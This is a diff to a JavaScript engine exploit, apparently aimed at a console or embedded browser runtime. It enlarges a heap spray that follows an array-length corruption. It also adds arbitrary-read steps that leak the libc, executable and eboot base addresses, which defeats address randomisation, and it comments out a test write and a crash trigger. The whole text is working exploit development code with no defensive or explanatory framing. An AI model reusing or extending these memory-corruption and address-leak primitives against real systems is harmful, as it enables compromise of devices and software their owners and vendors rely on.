@@ -267,7 +267,7 @@ while (true) {
 	arr.length = 0xfffffff0;
 
 	var new_indexing_header = new BigInt(0x100000, 0x100000);
-	for (var i = 0; i < 0x3000; i++)
+	for (var i = 0; i < 0x5000; i++)
 	{
 	    spray[i] = new Array(0x10).fill(new_indexing_header.d());
 
@@ -285,7 +285,7 @@ while (true) {
 
 	arr.splice(0x1000, 0, 1);
 
-	for (var i = 0; i < 0x3000; i++)
+	for (var i = 0; i < 0x5000; i++)
 	{
 	    if (spray[i].length > 0x10)
 	    {
@@ -488,10 +488,29 @@ var native_executable_constructor  = prim.read8(native_executable.add(new BigInt
 log(`native_executable_constructor: ${native_executable_constructor}`);
 
 var base_addr = native_executable_function.sub(new BigInt(0, 0xC6380));
+
+var _error_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E72398)));
+log(`_error_addr: ${_error_addr}`);
+
+var strerror_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E723B8)));
+log(`strerror_addr: ${strerror_addr}`);
+
+var libc_addr = strerror_addr.sub(new BigInt(0, 0x40410));
+
+var jsmaf_gc_addr = prim.leakval(jsmaf.gc);
+log(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`);
+
+var jsmaf_gc_native_addr = prim.read8(jsmaf_gc_addr.add(new BigInt(0, 0x18)));
+log(`jsmaf_gc_native_addr: ${jsmaf_gc_native_addr}`);
+
+var eboot_addr = jsmaf_gc_native_addr.sub(new BigInt(0, 0x39330));
+
 log(`base_addr: ${base_addr}`);
+log(`libc_addr: ${libc_addr}`);
+log(`eboot_addr: ${eboot_addr}`);
 
-prim.write8(native_executable.add(new BigInt(0, 0x40)), new BigInt(0x41414141, 0x41414141));
+//prim.write8(native_executable.add(new BigInt(0, 0x40)), new BigInt(0x41414141, 0x41414141));
 
-Math.min(BigInt.One.d());
+//Math.min(BigInt.One.d());
 
 while(true) {}
